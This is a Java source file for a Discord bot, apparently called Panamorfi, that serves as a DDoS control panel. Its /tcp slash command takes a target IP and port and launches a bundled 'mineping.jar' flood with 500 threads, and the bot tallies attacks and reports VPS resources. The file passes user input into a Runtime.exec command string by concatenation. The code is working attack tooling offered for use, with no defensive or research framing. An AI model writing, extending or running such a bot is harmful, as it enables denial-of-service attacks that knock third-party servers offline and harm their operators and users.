package yawix;

    import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.JDABuilder;
    import net.dv8tion.jda.api.OnlineStatus;
    import net.dv8tion.jda.api.entities.Activity;
    import net.dv8tion.jda.api.events.interaction.command.SlashCommandInteractionEvent;
    import net.dv8tion.jda.api.hooks.ListenerAdapter;
    import net.dv8tion.jda.api.interactions.commands.OptionType;
    import net.dv8tion.jda.api.interactions.commands.build.Commands;

import java.awt.Color;
import java.io.*;

    import org.apache.commons.lang3.StringUtils;

    import java.nio.file.CopyOption;
    import java.nio.file.Files;
    import java.nio.file.Path;
import java.text.CharacterIterator;
import java.text.StringCharacterIterator;
import java.util.ArrayList;
    import java.util.regex.Pattern;

    public class Connector extends ListenerAdapter {
        static final Pattern IP_PATTERN = Pattern.compile("^((2(([0-4][0-9])|(5[0-5])))|(1[0-9][0-9])|([1-9][0-9]{0,1}))(\\.((2(([0-4][0-9])|(5[0-5])))|(1[0-9][0-9])|([1-9][0-9]{0,1})|(0))){3}$");
        static final String BOT_CHANNEL_ID = "идканала";
        static final int VERSION = 1;
        static final Path fp = Path.of(System.getProperty("user.dir"), "mineping.jar");
        static ArrayList<String> blacklist = new ArrayList<String>();
        static int attacks = 0;

        public static void main(String[] args) throws IOException {
            JDABuilder jdaBuilder = JDABuilder.createDefault("токен");
            jdaBuilder.setStatus(OnlineStatus.DO_NOT_DISTURB);
            jdaBuilder.setActivity(Activity.streaming("Panamorfi DDOS", "pornohub.com"));
            jdaBuilder.addEventListeners(new Connector());
            jdaBuilder.build().updateCommands().addCommands(
            		Commands.slash("tcp", "Run ddos tcp attack (MinePing attack)")
                    .addOption(OptionType.STRING, "ipport", "Target server IP", true),
		            Commands.slash("phelp", "Help menu."),
		            Commands.slash("resolve", "Resolve ip")
		                    .addOption(OptionType.STRING, "domens", "Resolve domen to ip:port",true),
		            Commands.slash("ping", "Check VPS availability")
            ).queue();

            blacklist.add("127.0.0.1:8080");

            if (!Files.exists(fp)) {
                try {
                	Files.copy(Connector.class.getResourceAsStream("/mineping.jar"), fp, new CopyOption[0]);
                	System.out.println("Installed");
                } catch (Exception e) {
                    throw new RuntimeException(e);
                }
            }
        }

        @Override
        public void onSlashCommandInteraction(SlashCommandInteractionEvent event) {
        	if (!event.getChannelId().equals(BOT_CHANNEL_ID)){
                return;
            }
        	
        	if (event.getName().equals("tcp")) {
                try{
                    String ipport = event.getOption("ipport").getAsString();
                    String[] argso = ipport.split(":");
                    String ip = argso[0];
                    int port = Integer.parseInt(argso[1]);
                    Boolean valid_args = (Boolean) (IP_PATTERN.matcher(ip).matches() && (0 < port && port < 65535));
                    if (!valid_args) {
                        System.out.println("ERROR BAD IP OR PORT");
                    } else {
                    	System.out.println("ATTACK SENT");
                    	attacks++;
                        Runtime.getRuntime().exec("java -jar mineping.jar host-" + StringUtils.substringBefore(ipport, ":") + " port-" + StringUtils.substringAfter(ipport, ":") + " threads-500" );
                    }

                } catch (Exception e) {
                throw new RuntimeException(e);
                }
            } else if (event.getName().equals("ping")) {
            	 System.out.println("Ping ->");
				 EmbedBuilder eb = new EmbedBuilder();
				 long maxMemory = Runtime.getRuntime().maxMemory();
				 eb.setTitle("`\uD83D\uDD3B VPS`", null);
				 eb.setColor(Color.RED);
				 eb.addField("**`Available processors (cores) ~>`**", "**" + Runtime.getRuntime().availableProcessors() + "**", true);
				 eb.addField("**`Free memory ~>`**", "**" + humanReadableByteCountBin(Runtime.getRuntime().freeMemory()) + "**", true);
				 eb.addField("**`Maximum memory ~>`**", "**" + (maxMemory == Long.MAX_VALUE ? "no limit" : humanReadableByteCountBin(maxMemory)) + "**", true);
				 eb.addField("**`Total memory available to JVM ~>`**", "**" + humanReadableByteCountBin(Runtime.getRuntime().totalMemory()) + "**", true);
				 eb.addField("**`Total atacks since launch ~>`**", "**" + attacks + "**", true);
				 eb.addField("**`Version ~>`**", "**" + VERSION + "**", true);
				 eb.setAuthor("\uD83D\uDD39Panamorfi bot");
				 eb.setFooter("power by yawixooo.", "https://i.imgur.com/PEU4rWU.png");
				 event.getChannel().sendMessageEmbeds(eb.build()).queue();
				 System.out.println("<- Ping");
        }}
        
        public static String humanReadableByteCountBin(long bytes) {
    	    long absB = bytes == Long.MIN_VALUE ? Long.MAX_VALUE : Math.abs(bytes);
    	    if (absB < 1024) {
    	        return bytes + " B";
    	    }
    	    long value = absB;
    	    CharacterIterator ci = new StringCharacterIterator("KMGTPE");
    	    for (int i = 40; i >= 0 && absB > 0xfffccccccccccccL >> i; i -= 10) {
    	        value >>= 10;
    	        ci.next();
    	    }
    	    value *= Long.signum(bytes);
    	    return String.format("%.1f %ciB", value / 1024.0, ci.current());
    	}
    }
